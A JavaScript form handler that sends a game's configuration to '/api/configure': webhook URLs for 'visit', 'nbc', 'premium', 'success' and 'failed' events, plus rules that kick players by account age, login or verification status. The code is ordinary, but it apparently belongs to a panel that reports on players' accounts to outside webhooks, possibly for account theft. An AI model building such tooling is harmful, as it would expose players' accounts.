function handleConfigure(event) {
    event.preventDefault();

    const submitButton = document.getElementById('submitButton');
    submitButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Configuring...';
    submitButton.disabled = true;

    // Get input values

    //Webhooks

    const urlParams = new URLSearchParams(window.location.search);
    const game_id = urlParams.get('gameId');
    const visitWebhook = document.getElementById('visit').value;
    const nbcWebhook = document.getElementById('nbc').value;
    const premiumWebhook = document.getElementById('premium').value;
    const successWebhook = document.getElementById('success').value;
    const failedWebhook = document.getElementById('failed').value;

    // Game Settings
    const ageKick = parseInt(document.getElementById('age_kick').value);
    const ageKickMessage = document.getElementById('age_kick_message').value;
    const loginKick = document.getElementById('login_kick').value === 'true';
    const loginKickMessage = document.getElementById('login_kick_message').value;
    const verifiedKick = document.getElementById('verified_kick').value === 'true';
    const verifiedKickMessage = document.getElementById('verified_kick_message').value;
    // Prepare the configuration object
    const config_info = {
        webhooks: {
            visit: visitWebhook,
            nbc: nbcWebhook,
            premium: premiumWebhook,
            success: successWebhook,
            failed: failedWebhook,
        },
        game_configs: {
            age_kick: ageKick,
            age_kick_message: ageKickMessage,
            login_kick: loginKick,
            login_kick_message: loginKickMessage,
            verified_kick: verifiedKick,
            verified_kick_message: verifiedKickMessage,
        },
    };
    fetch('/api/configure', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            game_id,
            config_info,
        })
    }).then(response => {
        if (response.ok) {
            swal("Success", "Game Configuration Success", "success");
        } else {
            return response.json().then(data => {
                throw new Error(data.message);
            });
        }
    }).catch(error => {
        console.error('Error during whitelisting your game:', error);
        swal("Error", error.message || "Game Configuration Error Please Try Again", "error");
    }).finally(() => {
        // Revert the button state
        submitButton.innerHTML = 'Configure';
        submitButton.disabled = false;
    });;
}